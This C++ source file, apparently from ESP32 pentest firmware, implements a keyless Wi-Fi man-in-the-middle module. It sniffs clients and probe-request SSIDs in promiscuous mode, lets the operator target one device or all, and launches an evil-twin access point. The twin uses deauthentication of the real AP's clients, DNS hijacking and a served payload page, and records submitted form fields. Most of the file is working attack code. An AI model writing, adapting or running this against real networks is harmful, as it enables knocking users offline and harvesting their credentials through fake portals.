#include "mitm_uc.h"

#if !defined(LITE_VERSION)

#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/utils.h"
#include "core/wifi/wifi_common.h"
#include "mitm_menu.h"
#include "wifi_atks.h"
#include "wifi_raw_portal.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <globals.h>
#include <string.h>
#include <vector>

// Upper bound on how long an unconnected portal run may hold the station
// attached. Was WIFI_PORTAL_MAX_MS in Vandeta's wifi_atks.h; kept here so this
// file does not need that header.
#define WIFI_PORTAL_MAX_MS 600000

// ucmitm - the unconnected half of the MITM page.
//
// The connected engine (net_spoof.cpp) sends every frame through the keyed
// station link, which is why it works on WPA2 and why it needs the password.
// Without the password that link does not exist, so this path attacks the only
// surface that is readable and writable without a key:
//
//   * 802.11 headers. Data frames carry their transmitter address in the clear
//     even when the body is encrypted, so the clients of the picked AP can be
//     listed without joining it; probe requests carry the SSID they are looking
//     for, which is the passive recon this file reports.
//   * Management frames. Deauth/disassoc are not encrypted, so the real AP's
//     clients can be pushed off it.
//   * The twin AP. Once a client lands on it, every DHCP lease, DNS query and
//     HTTP request is ours - no key involved.
//
// The engine that does the twin itself is wifi_portal_run() (wifi_atks.cpp);
// this file owns the network picker, the client discovery and the payload glue.

#define MITM_UC_MAX_SEEKED 12
#define MITM_UC_SNIFF_MIN_MS 1000
#define MITM_UC_SNIFF_MAX_MS 30000

static bool sEnabled = false;
static String sSsid;
static uint8_t sBssid[6] = {0};
static bool sBssidOk = false;
static uint8_t sChannel = 0;

static uint8_t sClients[MITM_UC_MAX_CLIENTS][6];
static volatile int sClientCount = 0;
static int sTargetIdx = -1; // -1 = every client

static volatile bool sSniffing = false;
static String sSeeked[MITM_UC_MAX_SEEKED];
static volatile int sSeekedCount = 0;

// ---------------------------------------------------------------------------
// State
// ---------------------------------------------------------------------------

bool mitmUcEnabled() { return sEnabled; }

void mitmUcSetEnabled(bool on) { sEnabled = on; }

bool mitmUcNetworkOk() { return sSsid.length() > 0 && sChannel >= 1 && sChannel <= 14; }

String mitmUcSsid() { return sSsid; }

uint8_t mitmUcChannel() { return sChannel; }

bool mitmUcBssid(uint8_t out[6]) {
    if (!sBssidOk || out == nullptr) return false;
    memcpy(out, sBssid, 6);
    return true;
}

String mitmUcNetworkLabel() {
    if (sSsid.length() == 0) return String("pick one");
    String s = sSsid;
    if (s.length() > 16) s = s.substring(0, 16) + "..";
    return s + " ch" + String(sChannel);
}

static void ucSetNetwork(const String &ssid, const uint8_t *bssid, bool bssidOk, uint8_t ch) {
    sSsid = ssid;
    sChannel = ch;
    sBssidOk = bssidOk;
    if (bssidOk && bssid != nullptr) memcpy(sBssid, bssid, 6);
    else memset(sBssid, 0, sizeof(sBssid));
    sClientCount = 0;
    sTargetIdx = -1;
}

// ---------------------------------------------------------------------------
// Passive discovery
// ---------------------------------------------------------------------------

static String ucMacLabel(const uint8_t mac[6]) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return String(buf);
}

static void ucNoteClient(const uint8_t mac[6]) {
    if ((mac[0] & 0x01) != 0) return; // multicast / broadcast
    for (int i = 0; i < sClientCount; i++) {
        if (memcmp(sClients[i], mac, 6) == 0) return;
    }
    if (sClientCount >= MITM_UC_MAX_CLIENTS) return;
    memcpy(sClients[sClientCount], mac, 6);
    sClientCount = sClientCount + 1;
}

static void ucNoteSeeked(const char *ssid, int len) {
    if (len <= 0 || len > 32) return;
    String name;
    for (int i = 0; i < len; i++) {
        char c = ssid[i];
        if (c < 0x20 || c > 0x7e) return; // not a name this UI can show
        name += c;
    }
    name.trim();
    if (name.length() == 0) return;
    for (int i = 0; i < sSeekedCount; i++) {
        if (sSeeked[i] == name) return;
    }
    if (sSeekedCount >= MITM_UC_MAX_SEEKED) return;
    sSeeked[sSeekedCount] = name;
    sSeekedCount = sSeekedCount + 1;
}

// Probe requests carry the SSID the device is looking for, in the clear. That is
// the unconnected answer to "what is on this network": no association, no key.
static void ucNoteProbe(const uint8_t *frame, int len) {
    if (len < 26) return;
    if ((frame[0] & 0xF0) != 0x40) return; // probe request
    int p = 24;                            // probe requests have no fixed fields
    while (p + 2 <= len) {
        uint8_t id = frame[p];
        int elen = frame[p + 1];
        if (p + 2 + elen > len) break;
        if (id == 0) ucNoteSeeked((const char *)frame + p + 2, elen); // SSID IE
        p += 2 + elen;
    }
}

static void ucSniffCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!sSniffing || !sBssidOk) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    if (pkt->rx_ctrl.sig_len < 24) return;
    const uint8_t *p = pkt->payload;

    if (type == WIFI_PKT_DATA) {
        // addr1 receiver, addr2 transmitter, addr3 BSSID of a data frame.
        if (memcmp(p + 4, sBssid, 6) != 0 && memcmp(p + 16, sBssid, 6) != 0) return;
        if (memcmp(p + 10, sBssid, 6) == 0) return; // the AP itself
        ucNoteClient(p + 10);
        return;
    }
    if (type == WIFI_PKT_MGMT) ucNoteProbe(p, pkt->rx_ctrl.sig_len);
}

int mitmUcScanClients(uint32_t ms) {
    if (!mitmUcNetworkOk() || !sBssidOk) return 0;
    if (ms < MITM_UC_SNIFF_MIN_MS) ms = MITM_UC_SNIFF_MIN_MS;
    if (ms > MITM_UC_SNIFF_MAX_MS) ms = MITM_UC_SNIFF_MAX_MS;

    sClientCount = 0;
    sSeekedCount = 0;
    if (!wifi_raw_prepare(sChannel)) return 0;

    sSniffing = true;
    esp_wifi_set_promiscuous_rx_cb(ucSniffCallback);
    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);

    uint32_t started = millis();
    while (millis() - started < ms) vTaskDelay(pdMS_TO_TICKS(50));

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    sSniffing = false;
    wifi_raw_cleanup();

    if (sTargetIdx >= sClientCount) sTargetIdx = -1;
    Serial.printf("[UC-MITM] sniff %lums on ch%d: %d client(s), %d sought ssid(s)\n",
                  (unsigned long)ms, sChannel, (int)sClientCount, (int)sSeekedCount);
    return sClientCount;
}

/// Passive watch with no AP requirement: every station on one channel.
///
/// Used when the picked-AP path is not available (the recon payload that has no
/// page to serve, and the connected recon that could not make an ARP pair). Data
/// frame transmitters and probe-request SSIDs are both in the clear, so this
/// needs no key and no association with the network being watched.
static void ucPassiveCallback(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (!sSniffing) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    if (pkt->rx_ctrl.sig_len < 24) return;
    const uint8_t *p = pkt->payload;
    if (type == WIFI_PKT_MGMT) {
        ucNoteProbe(p, pkt->rx_ctrl.sig_len);
        return;
    }
    if (type != WIFI_PKT_DATA) return;
    ucNoteClient(p + 10); // transmitter
}

int mitmUcPassiveScan(uint8_t channel, uint32_t ms) {
    if (channel < 1 || channel > 14) {
        if (!WiFi.isConnected()) return 0;
        channel = (uint8_t)WiFi.channel();
    }
    if (ms < MITM_UC_SNIFF_MIN_MS) ms = MITM_UC_SNIFF_MIN_MS;
    if (ms > MITM_UC_SNIFF_MAX_MS) ms = MITM_UC_SNIFF_MAX_MS;

    sClientCount = 0;
    sSeekedCount = 0;
    sTargetIdx = -1;
    if (!wifi_raw_prepare(channel)) return 0;

    sSniffing = true;
    esp_wifi_set_promiscuous_rx_cb(ucPassiveCallback);
    wifi_promiscuous_filter_t filter = {.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL};
    esp_wifi_set_promiscuous_filter(&filter);
    esp_wifi_set_promiscuous(true);

    uint32_t started = millis();
    while (millis() - started < ms) vTaskDelay(pdMS_TO_TICKS(50));

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(NULL);
    sSniffing = false;
    wifi_raw_cleanup();

    Serial.printf(
        "[UC-MITM] passive %lums on ch%d: %d station(s), %d sought ssid(s)\n", (unsigned long)ms, channel,
        (int)sClientCount, (int)sSeekedCount
    );
    return sClientCount;
}

int mitmUcClientCount() { return sClientCount; }

String mitmUcClientLabel(int idx) {
    if (idx < 0 || idx >= sClientCount) return String("?");
    return ucMacLabel(sClients[idx]);
}

int mitmUcProbeCount() { return sSeekedCount; }

String mitmUcProbeSsid(int idx) {
    if (idx < 0 || idx >= sSeekedCount) return String();
    return sSeeked[idx];
}

bool mitmUcSetTargetClient(int idx) {
    if (idx >= sClientCount) return false;
    sTargetIdx = idx; // -1 is accepted: "all devices"
    return true;
}

void mitmUcTargetAll() { sTargetIdx = -1; }

String mitmUcTargetLabel() {
    if (sTargetIdx >= 0 && sTargetIdx < sClientCount) return ucMacLabel(sClients[sTargetIdx]);
    return String("All devices (deauth + twin)");
}

// ---------------------------------------------------------------------------
// Pickers
// ---------------------------------------------------------------------------

static void ucClearKeys() {
    EscPress = false;
    SelPress = false;
    PrevPress = false;
    NextPress = false;
    UpPress = false;
    DownPress = false;
    AnyKeyPress = false;
}

struct UcNet {
    String ssid;
    uint8_t bssid[6] = {0};
    bool bssidOk = false;
    uint8_t ch = 0;
};

/// Scan and remember the picked network. Deliberately no _wifiConnect(): the
/// whole point of ucmitm is that there is no password to connect with.
void mitmUcPickNetwork() {
    wifiEnsureRadioMem();
    drawMainBorderWithTitle("ucmitm Network");
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawString("Scanning...", 10, 50);

    int found = wifiScanNets(false);
    if (found <= 0) {
        displayError("No networks found", true);
        ucClearKeys();
        return;
    }

    std::vector<Option> rows;
    for (int i = 0; i < found && i < 24; i++) {
        UcNet net;
        net.ssid = WiFi.SSID(i);
        net.ch = (uint8_t)WiFi.channel(i);
        if (WiFi.BSSID(i) != nullptr) {
            memcpy(net.bssid, WiFi.BSSID(i), 6);
            net.bssidOk = true;
        }
        String label = net.ssid.length() ? net.ssid : String("(hidden)");
        label += "  ch" + String(net.ch);
        label += (WiFi.encryptionType(i) == WIFI_AUTH_OPEN) ? "  open" : "  locked";
        // Captured by value: the scan list is rebuilt by every later scan.
        rows.push_back({label, [net]() {
                            if (net.ssid.length() == 0) {
                                displayError("Hidden SSID cannot be twin'd", true);
                                return;
                            }
                            ucSetNetwork(net.ssid, net.bssid, net.bssidOk, net.ch);
                        }});
    }
    rows.push_back({"Back", []() {}});
    loopOptions(rows, MENU_TYPE_SUBMENU, "ucmitm Network");
    ucClearKeys();
}

/// Headless network pick (the console verb and the tests).
bool mitmUcSelectNetwork(const String &name, String &error) {
    String want = name;
    want.trim();
    if (want.length() == 0) {
        error = "usage: mitm uc net <ssid>";
        return false;
    }
    int found = wifiScanNets(false);
    if (found <= 0) {
        error = "no networks found";
        return false;
    }
    for (int i = 0; i < found; i++) {
        String ssid = WiFi.SSID(i);
        String bssid = WiFi.BSSID(i) != nullptr ? WiFi.BSSIDstr(i) : String();
        if (ssid != want && !bssid.equalsIgnoreCase(want)) continue;
        uint8_t mac[6] = {0};
        bool ok = WiFi.BSSID(i) != nullptr;
        if (ok) memcpy(mac, WiFi.BSSID(i), 6);
        ucSetNetwork(ssid, mac, ok, (uint8_t)WiFi.channel(i));
        return true;
    }
    error = "not in the scan: " + want;
    return false;
}

void mitmUcEnsureNetwork() {
    if (mitmUcNetworkOk() || !WiFi.isConnected()) return;
    uint8_t mac[6] = {0};
    bool ok = WiFi.BSSID() != nullptr;
    if (ok) memcpy(mac, WiFi.BSSID(), 6);
    ucSetNetwork(WiFi.SSID(), mac, ok, (uint8_t)WiFi.channel());
    Serial.printf("[UC-MITM] network from the station: %s ch%d\n", sSsid.c_str(), sChannel);
}

void mitmUcPickTarget() {
    // The network the board is already on is the obvious target, so an empty
    // pick is filled from the station instead of refusing with "pick a network
    // first" on a page where the rows in between can hide that step.
    mitmUcEnsureNetwork();
    if (!mitmUcNetworkOk()) {
        displayError("Pick a network first", true);
        return;
    }
    drawMainBorderWithTitle("ucmitm Target");
    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
    tft.drawString("Listening...", 10, 50);
    int found = mitmUcScanClients(6000);

    std::vector<Option> rows;
    rows.push_back({String("All devices (") + String(found) + " seen)", []() { mitmUcTargetAll(); }});
    for (int i = 0; i < found; i++) {
        rows.push_back({mitmUcClientLabel(i), [i]() { mitmUcSetTargetClient(i); }});
    }
    for (int i = 0; i < mitmUcProbeCount() && i < 4; i++) {
        rows.push_back({String("seeks: ") + mitmUcProbeSsid(i), []() {}});
    }
    rows.push_back({"Re-scan", []() { mitmUcPickTarget(); }});
    rows.push_back({"Back", []() {}});
    loopOptions(rows, MENU_TYPE_SUBMENU, "ucmitm Target");
    ucClearKeys();
}

// ---------------------------------------------------------------------------
// The run
// ---------------------------------------------------------------------------

String mitmUcRun(const MitmScriptResult &payload, uint32_t durationMs, bool draw, String &summary) {
    mitmUcEnsureNetwork();
    if (!mitmUcNetworkOk()) return "err: pick a network for ucmitm first";

    // A twin has no internet path of its own, so a 302 to the real world would
    // land on a dead end. Serve what the payload can actually hand over: its
    // page, then its `offline page`, then its redirect.
    String html, redirect;
    if (netspoof_http_inject_count() > 0) {
        const NetSpoofRule *rule = netspoof_http_inject_rule(0);
        if (rule) html = rule->value;
    }
    if (html.length() == 0 && payload.offlinePage.length() > 0) {
        MitmPayloadResult read;
        html = mitmPayloadRead(payload.offlinePage, MITM_HTML_MAX, read);
    }
    if (html.length() == 0 && netspoof_http_redirect_count() > 0) {
        const NetSpoofRule *rule = netspoof_http_redirect_rule(0);
        if (rule) redirect = rule->value;
    }
    if (html.length() == 0 && redirect.length() == 0) {
        return "err: this payload has nothing the twin can serve (add `page` or `offline page`)";
    }

    WifiPortalConfig cfg;
    cfg.ssid = payload.ucTwinSsid.length() ? payload.ucTwinSsid : sSsid;
    cfg.channel = sChannel;
    cfg.deauth = payload.ucDeauth;
    if (sBssidOk) {
        memcpy(cfg.targetBssid, sBssid, 6);
        cfg.hasTargetBssid = true;
    }
    if (sTargetIdx >= 0 && sTargetIdx < sClientCount) {
        memcpy(cfg.targetClient, sClients[sTargetIdx], 6);
        cfg.hasTargetClient = true;
    }
    cfg.html = html;
    cfg.redirect = redirect;
    cfg.hijackDns = true;
    cfg.draw = draw;
    // No explicit duration: the task 1 tunable `portal.hold_ms` decides how long
    // the twin holds (default 600000 = the WIFI_PORTAL_MAX_MS it replaced).
    cfg.durationMs =
        durationMs > 0 ? durationMs : (uint32_t)WIFI_PORTAL_MAX_MS;

    Serial.printf(
        "[UC-MITM] twin '%s' ch%d deauth=%d target=%s\n", cfg.ssid.c_str(), cfg.channel, cfg.deauth ? 1 : 0,
        cfg.hasTargetClient ? ucMacLabel(cfg.targetClient).c_str() : "broadcast"
    );

    // The twin owns the radio in AP mode, which drops the station link. Remember
    // where the station was, so the board rejoins its own network the moment the
    // twin stops - otherwise every ucmitm run left it offline until a manual
    // `wifi on` (measured: `mitm status` showed station=down right after a run).
    String prevSsid = WiFi.isConnected() ? WiFi.SSID() : String();
    int prevEnc = 8; // WIFI_AUTH_WPA2_PSK is what _wifiConnect() expects by default
    uint8_t prevCh = prevSsid.length() ? (uint8_t)WiFi.channel() : 0;
    wifi_ap_record_t prevAp;
    memset(&prevAp, 0, sizeof(prevAp));
    if (prevSsid.length() && esp_wifi_sta_get_ap_info(&prevAp) == ESP_OK) prevEnc = (int)prevAp.authmode;
    uint8_t prevBssid[6] = {0};
    bool prevBssidOk = false;
    if (prevSsid.length() && WiFi.BSSID() != nullptr) {
        memcpy(prevBssid, WiFi.BSSID(), 6);
        prevBssidOk = true;
    }

    WifiPortalStats st = wifi_portal_run(cfg);

    if (prevSsid.length()) {
        Serial.printf("[UC-MITM] rejoining %s\n", prevSsid.c_str());
        if (!_wifiConnect(prevSsid, prevEnc, prevCh, prevBssidOk ? prevBssid : nullptr)) {
            Serial.println("[UC-MITM] rejoin failed - `wifi on` brings it back");
        }
    }

    if (!st.ok) return String("err: ") + (st.error != nullptr ? st.error : "twin portal failed");

    // "joined" is what the twin saw, not what the AP has: a twin that nobody
    // adopts legitimately reports 0, and calling that "clients" read like the
    // discovery had found nobody.
    summary = String("twin ") + cfg.ssid + " ch" + String(st.channel) + " joined " + String(st.clients) +
              " requests " + String(st.requests) + " deauth " + String(st.deauthFrames) + " up " +
              String(st.elapsedMs / 1000) + "s";
    if (st.fieldSets > 0) summary += " forms " + String(st.fieldSets) + " [" + st.lastFields + "]";
    Serial.printf("[UC-MITM] %s\n", summary.c_str());
    return String();
}

#endif // !LITE_VERSION
